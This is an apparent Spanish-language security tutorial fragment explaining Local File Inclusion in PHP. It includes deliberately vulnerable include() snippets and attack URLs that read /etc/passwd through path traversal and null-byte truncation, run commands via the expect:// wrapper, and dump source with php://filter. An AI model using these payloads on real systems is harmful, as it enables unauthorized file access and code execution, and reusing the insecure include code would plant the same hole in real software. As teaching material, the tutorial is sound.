I"D<p>La vulnerabilidad ‘Local File Inclusion’ permite a un atacante leer un archivo del servidor vulnerable, se produce debido a un error de programación de la página.</p>

<p>Dependiendo de la importancia, esta vulnerabilidad puede llevar al atacante a:</p>

<ul>
  <li>RCE (Remote Code Execution)</li>
  <li>XSS (Cross-Site Scripting)</li>
  <li>DoS (Denial Of Service)</li>
</ul>

<p>Un ejemplo muy básico sería el siguiente script de php:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
	<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
	<span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://localhost/lfi.php?filename=/etc/passwd
</code></pre></div></div>

<p>Esto no es solo una vulnerabilidad de php, también está presente en otros lenguajes como jsp, asp, entre otros.</p>

<h3 id="directory-path-traversal"><a href="#header-3"></a>Directory Path Traversal</h3>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
	<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
	<span class="k">include</span><span class="p">(</span><span class="s2">"/var/www/html/"</span> <span class="mf">.</span> <span class="nv">$file</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Solo podemos utilzar el contenido de la ruta especificada; sin embargo, si añadimos ‘../’, podremos listar contenido más allá de ‘/var/www/html/’.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://localhost/lfi.php?filename=../../../etc/passwd
</code></pre></div></div>

<p>[*] Null Byte</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    1 | &lt;?php
    2 |     $file = $_GET['filename'];
    3 |     require($file . ".php");
    4 | ?&gt;
</code></pre></div></div>

<p>El ‘.php’ se añade al nombre del archivo; sin embargo, si añadimos el nullbyte al final de nuestra cadena de ataque, el ‘.php’ no será tenido en cuenta.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://localhost/lfi.php?filename=/etc/passwd%00
</code></pre></div></div>

<p>[*] Wrappers</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[expect://]

	Ejecutar comandos.

	https://localhost/lfi.php?filename=expect://whoami

[filter://]

	Leer php.

	https://localhost/lfi.php?filename=php://filter/convert.base64-encode/resource=
</code></pre></div></div>

:ET